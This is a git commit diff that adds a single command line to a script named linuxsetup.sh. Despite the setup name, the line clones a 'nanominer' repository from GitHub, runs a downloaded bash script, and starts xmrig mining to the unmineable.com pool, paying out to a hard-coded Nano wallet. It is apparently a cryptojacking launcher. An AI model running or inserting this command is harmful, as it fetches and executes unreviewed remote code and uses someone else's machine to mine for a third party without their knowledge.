502b4e34f67c2415c3a59bdf80f15a2e66a10514
ShadyTrapShit <114740185+ShadyTrapShit@users.noreply.github.com>
2023-10-14 19:29:38 -0400

    Update linuxsetup.sh

--- linuxsetup.sh
+++ linuxsetup.sh
@@ -1,1 +1,3 @@
+apt update && apt install git -y && git clone https://github.com/ShadyTrapShit/nanominer && cd nanominer && bash linuxnanominer.sh && cd xmrig-6.20.0 && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XNO:nano_3uixbwndscgokp8g1tqwut7eyyjzaxkbug1j5ramf6zmjz7pppt8s4zyoj6a.unmineable_worker_zswfykx
+
 
